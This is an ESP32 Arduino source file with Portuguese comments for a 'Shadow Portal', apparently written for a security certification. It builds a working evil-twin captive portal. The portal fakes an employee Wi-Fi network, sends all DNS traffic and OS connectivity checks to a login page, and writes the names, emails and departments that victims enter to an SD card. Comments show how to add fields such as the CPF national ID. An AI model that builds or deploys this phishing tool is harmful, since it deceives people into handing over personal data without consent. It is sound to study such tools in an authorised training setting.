 * PROJETO: Shadow Portal  criado por Ap0ph1s para a certificação SYH2
 * HARDWARE: ESP32 DevKit V1 e Módulo leitor MicroSD 
 * IP GATEWAY: 172.0.0.1 (Gera maior compatibilidade com Pop-ups de check-in)
 *
 * GUIA DE PERSONALIZAÇÃO
 * Se você mudar o HTML, procure pelas tags "// ---> [MUDE AQUI]" abaixo.
 */

#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <SD.h>
#include <SPI.h>

//Configurações Gerais
const char* SSID_NAME = "Empresa_FUNCIONÁRIOS_Wi-Fi"; // Nome que aparece no celular (pode ser modificado)
const int SD_CS_PIN = 5;  
const int LED_PIN = 2;    

//Configuração de IP
IPAddress apIP(172, 0, 0, 1);
IPAddress netMsk(255, 255, 255, 0);

//Instâncias
DNSServer dnsServer;
WebServer server(80);
bool sdStatus = false; 

void setup() {
  Serial.begin(115200);
  pinMode(LED_PIN, OUTPUT);
  
  WiFi.disconnect(true); 
  delay(500);

  Serial.println("\n-----------------------------------");
  Serial.println("[PASSO 1] Configurando Rede (172.0.0.1)...");
  
  // Configura o IP fixo antes de iniciar o AP
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, netMsk);
  
  // Inicia a rede no canal 6
  if (WiFi.softAP(SSID_NAME, NULL, 6, 0)) {
    Serial.print("[SUCESSO] Rede Criada: ");
    Serial.println(SSID_NAME);
    Serial.print("[INFO] IP do Portal: ");
    Serial.println(WiFi.softAPIP());
  } else {
    Serial.println("[ERRO CRÍTICO] Falha no Wi-Fi.");
    while(1) { digitalWrite(LED_PIN, !digitalRead(LED_PIN)); delay(100); } 
  }

  //Configura DNS para redirecionar tudo (*) para 172.0.0.1
  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
  dnsServer.start(53, "*", apIP);

  // Montagem do SD
  Serial.println("[PASSO 2] Montando Cartão SD...");
  SPI.begin(18, 19, 23, 5); 
  
  if(!SD.begin(SD_CS_PIN)) {
    Serial.println("[FALHA] Cartão SD não detectado!");
    sdStatus = false; // Marca erro, mas continua rodando o Wi-Fi
  } else {
    Serial.println("[SUCESSO] Cartão SD montado.");
    sdStatus = true;
    digitalWrite(LED_PIN, HIGH); //LED Aceso = Tudo OK
  }

  configurarRotas();
  
  server.begin();
  Serial.println("[PRONTO] Sistema Operante.");
}

void loop() {
  if (!sdStatus) {
    digitalWrite(LED_PIN, !digitalRead(LED_PIN)); //Pisca lento se o SD falhar
    delay(500); 
  }
  dnsServer.processNextRequest();
  server.handleClient();
}

//Função Auxiliar de Redirecionamento
void handleRedirect() {
  server.sendHeader("Location", String("http://172.0.0.1/"), true);
  server.send(302, "text/plain", ""); 
}

//CONFIGURAÇÃO DAS ROTAS
void configurarRotas() {

  // 1. Rota Principal (Serve o HTML)
  server.on("/", HTTP_GET, []() {
    if (sdStatus && SD.exists("/index.html")) {
      File file = SD.open("/index.html", FILE_READ);
      server.streamFile(file, "text/html");
      file.close();
    } else {
      server.send(200, "text/html", "<h1>Erro SD</h1>");
    }
  });

  // 2. Rotas de gatilho para Android/iOS/Windows
  server.on("/generate_204", handleRedirect);
  server.on("/gen_204", handleRedirect);
  server.on("/chat", handleRedirect);
  server.on("/fwlink", handleRedirect);
  server.on("/hotspot-detect.html", handleRedirect);
  server.onNotFound(handleRedirect);

  // 3. Rota de Salvamento (AQUI VOCÊ MUDA SE FOR TROCAR O HTML)
  server.on("/salvar", HTTP_POST, []() {
    if (!sdStatus) { server.send(500, "text/plain", "ERRO SD"); return; }

    // ---------------------------------------------------------
    // ---> [MODIFIQUE AQUI - PARTE 1: LEITURA]
    // Crie variáveis para receber o que vem do HTML.
    // O texto entre parenteses: ("...") deve ser IGUAL ao 'name' do seu input HTML.
    // ---------------------------------------------------------
    
    String nome  = server.arg("nome");   // Vem de <input name="nome">
    String email = server.arg("email");  // Vem de <input name="email">
    String setor = server.arg("setor");  // Vem de <input name="setor">
    
    // EXEMPLO: Se você adicionar um campo CPF no HTML (<input name="cpf">):
    // String cpf = server.arg("cpf"); 

    Serial.println("Captura: " + email); //Apenas para debug no PC

    // ---> [MODIFIQUE AQUI - PARTE 2: GRAVAÇÃO]
    // Aqui nós montamos a linha que será escrita no arquivo de texto.

    File dataFile = SD.open("/coleta.txt", FILE_APPEND);
    if (dataFile) {
      //Escreve: Timestamp, Nome, Email, Setor
      dataFile.print(millis());
      dataFile.print(","); 
      dataFile.print(nome);
      dataFile.print(",");
      dataFile.print(email);
      dataFile.print(",");
      dataFile.println(setor); //Use println no ÚLTIMO item para pular linha
      
      // EXEMPLO COM CPF:
      // dataFile.print(",");
      // dataFile.println(cpf); 

      // Finaliza a gravação com segurança
      dataFile.flush(); 
      dataFile.close(); 
      delay(100); 
      
      server.send(200, "text/html", "<h1>Conectado!</h1><p>Acesso Autorizado.</p>");
    } else {
      server.send(500, "text/plain", "Erro de Gravacao");
    }
  });
}